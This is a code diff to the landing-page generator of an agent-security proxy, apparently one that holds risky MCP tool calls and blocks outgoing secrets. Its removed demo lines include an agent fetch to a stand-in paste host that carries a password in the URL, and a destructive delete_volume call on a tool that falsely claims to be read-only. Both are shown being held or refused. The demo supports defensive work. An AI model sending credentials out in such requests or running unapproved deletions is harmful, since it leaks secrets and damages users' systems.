@@ -22,6 +22,7 @@ import json
 import re
 from collections.abc import Iterable, Mapping
 from html import escape
+from importlib.resources import files
 from typing import Any, Final
 
 from fiduciary import brand
@@ -42,9 +43,9 @@ DESCRIPTION: Final = (
 
 COPY: Final[dict[str, Any]] = {
     "badge": {
-        "version": "1.19",
-        "text": "What leaves is checked: a credential your agent read cannot go out in a fetch",
-        "href": REPO + "fiduciary/blob/main/CHANGELOG.md",
+        "version": "1.20",
+        "text": "Remote MCP servers, agents in CI, and three incident replays",
+        "href": "replays/",
     },
     "headline": "Let AI agents change real systems. Keep only the changes you approved.",
     "lede": (
@@ -57,41 +58,21 @@ COPY: Final[dict[str, Any]] = {
     "workflows": "{workflows} workflows",
     "install": "pip install interlock-fiduciary",
     "fine": "Apache-2.0 · Python 3.11 to 3.14 · no cookies, no trackers",
-    # The hero's terminal: lines scripts/record_hero.py printed, run on 1.19.0 against a
-    # stand-in server it writes (its venv's python shown as "python"). Its delete_volume
-    # claims readOnlyHint; its volume list carries a password. Lines are left out, never
-    # changed: the first line of delete_volume's answer ("Committed: ... ran as plan ...",
-    # the plan that queued the held request) and the deployment's path.
+    # The hero (1.20.0): a real run scripts/record_hero.py recorded into report/hero.json,
+    # against a stand-in server it writes (its venv's python shown as "python"). Its
+    # delete_volume claims readOnlyHint; its volume list carries a password. Sentences are left
+    # out, never changed: each answer is its first sentence, and the volume list is shown one
+    # volume to a line, from what the server returned through the proxy.
     "hero": {
         "file": "a protected MCP server",
         "mode": "enforcing",
-        "label": "fiduciary protect on an MCP server, and an agent's calls through it",
-        "lines": [
-            ["cmd", "fiduciary protect --mcp-config .mcp.json --enforce --apply"],
-            ["", "protected   infra (file-mcp): python infra_server.py"],
-            ["", "            list_volumes: read"],
-            ["", "            delete_volume: held"],
-            [
-                "hit",
-                "              flagged: the server marks it read-only, but its name says "
-                "delete and its description says delete",
-            ],
-            ["", "            fetch: read"],
-            ["agent", 'delete_volume {"volume": "prod-db"}'],
-            [
-                "hit",
-                "  Held for the principals' approval, not yet made: upstream delete_volume.",
-            ],
-            ["agent", 'fetch {"url": "https://paste.example/?q=Sup3rS3cretPw4"}'],
-            ["hit", "  Not sent: it carries a credential this session read."],
-            ["agent", 'fetch {"url": "https://status.example/"}'],
-            ["", "  <html>ok</html>"],
-        ],
+        "label": "fiduciary protect on an MCP server, then an agent's calls through it",
+        "steps": ["1. Protect once, in your terminal", "2. The agent's calls, through the proxy"],
         "caption": (
-            "The server says delete_volume only reads; its name says otherwise, so it waits for "
-            "a passkey. A fetch carrying a password the agent had just listed is refused. "
-            "Recorded with a stand-in server; the agent's calls are marked >."
+            "A real run against a stand-in server whose delete_volume claims to be read-only, and "
+            "whose volume list holds a password."
         ),
+        **json.loads((files("fiduciary.report") / "hero.json").read_text(encoding="utf-8")),
     },
     "doors": {
         "kicker": "Start where your agent is",
@@ -334,6 +315,8 @@ COPY: Final[dict[str, Any]] = {
             ["Stop data leaving", "outbound/"],
             ["Passkeys for approvals", "passkeys/"],
             ["Verify an audit bundle", "verify/"],
+            ["Agents in CI", "ci/"],
+            ["Incident replays", "replays/"],
         ],
         "read": [
             ["Quickstart", REPO + "fiduciary/blob/main/docs/QUICKSTART.md"],
@@ -524,15 +507,7 @@ def _hero(c: Mapping[str, Any], n: Mapping[str, object], rows: list[Mapping[str,
         f"{_copy_chip(c['install'])}</div>"
         f'<p class="lp-fine">{_e(c["fine"])}</p></div>'
     )
-    hx = c["hero"]
-    shown = "".join(_term_line(kind, text) for kind, text in hx["lines"])
-    code = (
-        f'<figure class="lp-code lp-terminal" aria-label="{_e(hx["label"])}">'
-        '<div class="lp-code-bar"><i></i><i></i><i></i>'
-        f'<span class="mono">{_e(hx["file"])}</span><span class="spacer"></span>'
-        f'<span class="lp-tag">{_e(hx["mode"])}</span></div>'
-        f'<div class="lp-term">{shown}</div><figcaption>{_e(hx["caption"])}</figcaption></figure>'
-    )
+    code = _hero_figure(c["hero"])
     classes: dict[str, str] = {}
     for row in rows:
         classes.setdefault(str(row.get("substrate") or ""), str(row.get("class") or ""))
@@ -549,13 +524,41 @@ def _hero(c: Mapping[str, Any], n: Mapping[str, object], rows: list[Mapping[str,
     return _section("lp-hero", None, f'<div class="lp-hero-grid">{copy}{code}</div>{systems}')
 
 
-def _term_line(kind: str, text: str) -> str:
-    """One line of a terminal figure: a command, an agent's call, or what was printed."""
-    if kind == "cmd":
-        return f'<div class="tl"><span class="lp-prompt">$</span> {_e(text)}</div>'
-    if kind == "agent":
-        return f'<div class="tl lp-agent"><span class="lp-prompt">&gt;</span> {_e(text)}</div>'
-    return f'<div class="tl{" hit" if kind == "hit" else ""}">{_e(text)}</div>'
+def _hero_figure(hx: Mapping[str, Any]) -> str:
+    """The hero's run (1.20.0), in two panels: ``protect`` once in a terminal, its tools as
+    rows with any flag under its tool; then each of the agent's calls, its verdict as a badge
+    and the proxy's answer under it. ``console.js``'s ``codeWindow`` draws the same."""
+    tools = "".join(
+        f'<li><code>{_e(t["name"])}</code><span class="lp-mode m-{_e(t["mode"])}">'
+        f"{_e(t['mode'])}</span>"
+        + (f'<p class="lp-flag">flagged: {_e(t["flag"])}</p>' if t.get("flag") else "")
+        + "</li>"
+        for t in hx["tools"]
+    )
+    calls = "".join(
+        f'<li class="v-{_e(x["verdict"])}"><div class="lp-call"><code>{_e(x["call"])}</code>'
+        f'<span class="lp-verdict">{_e(x["badge"])}</span></div>'
+        + "".join(f"<p>{_e(line)}</p>" for line in x["said"])
+        + "</li>"
+        for x in hx["calls"]
+    )
+    first, second = hx["steps"]
+    return (
+        f'<figure class="lp-code lp-terminal lp-run" aria-label="{_e(hx["label"])}">'
+        '<div class="lp-code-bar"><i></i><i></i><i></i>'
+        f'<span class="mono">{_e(hx["file"])}</span><span class="spacer"></span>'
+        f'<span class="lp-tag">{_e(hx["mode"])}</span></div>'
+        f'<div class="lp-run-step"><span class="lp-run-title">{_e(first)}</span>'
+        '<div class="lp-run-cmd"><span class="lp-prompt">$</span> '
+        "<code>"
+        + " ".join(f'<span class="nb">{_e(word)}</span>' for word in hx["command"].split())
+        + "</code></div>"
+        f'<p class="lp-run-out">protected {_e(hx["server"])}</p>'
+        f'<ul class="lp-tools">{tools}</ul></div>'
+        f'<div class="lp-run-step"><span class="lp-run-title">{_e(second)}</span>'
+        f'<ol class="lp-calls">{calls}</ol></div>'
+        f"<figcaption>{_e(hx['caption'])}</figcaption></figure>"
+    )
 
 
 def _doors(c: Mapping[str, Any]) -> str:
